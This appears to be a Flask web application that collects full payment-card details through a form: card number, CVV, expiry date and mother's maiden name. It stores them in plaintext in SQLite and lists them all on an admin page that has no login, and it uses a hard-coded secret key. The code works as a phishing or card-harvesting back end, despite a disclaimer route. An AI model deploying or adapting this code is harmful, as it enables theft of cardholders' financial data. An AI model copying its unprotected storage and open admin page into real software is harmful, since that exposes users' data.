from flask import Flask, render_template, request, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timezone

app = Flask(__name__)

app.secret_key = "oogly boogly"

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///money.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

class Profile(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    num = db.Column(db.String(16), nullable=False)
    cvv = db.Column(db.String(4), nullable=False)
    expDate = db.Column(db.String(5), nullable=False)
    mName = db.Column(db.String(100), nullable=False)
    con = db.Column(db.String(100), nullable=False)
    ungaBunga = db.Column(db.Boolean, default=False)
    date_created = db.Column(db.DateTime, default=datetime.now(timezone.utc))

with app.app_context():
    db.create_all()

@app.route("/")
def home():
    return redirect(url_for('form'))

@app.route('/form', methods=['GET', 'POST'])
def form():
    if request.method == 'POST':
        name = request.form.get('name', '').strip()
        num = request.form.get('num', '').strip()
        cvv = request.form.get('cvv', '').strip()
        expDate = request.form.get('expDate', '').strip()
        mName = request.form.get('mName', '').strip()
        con = request.form.get('con', '').strip()
        ungaBunga = request.form.get('ungaBunga') == "yes"  # true if checked

        # validation
        if not name or not num or not cvv or not expDate or not mName or not con:
            error = "please fill in all required fields"
            return render_template('defaultForm.html', error=error)
        
        try:
            new_profile = Profile(
                name=name,
                num=num,
                cvv=int(cvv),
                expDate=expDate,
                mName=mName,
                con=con,
                ungaBunga=ungaBunga
            )
            db.session.add(new_profile)
            db.session.commit()
        except Exception as e:
            db.session.rollback()
            error = "an error occurred while saving your data, please try again."
            return render_template('defaultForm.html', error=error)

        return render_template(
            'formSuccess.html',
            name=name,
            num=num,
            cvv=cvv,
            expDate=expDate,
            mName=mName,
            con=con,
            ungaBunga=ungaBunga
        )
    return render_template('defaultForm.html')

@app.route('/disclaimer')
def disclaimer():
    return render_template('disclaimer.html')

@app.route('/admin/profiles')
def admin_profiles():
    profiles = Profile.query.all()
    return render_template('admin_profiles.html', profiles=profiles)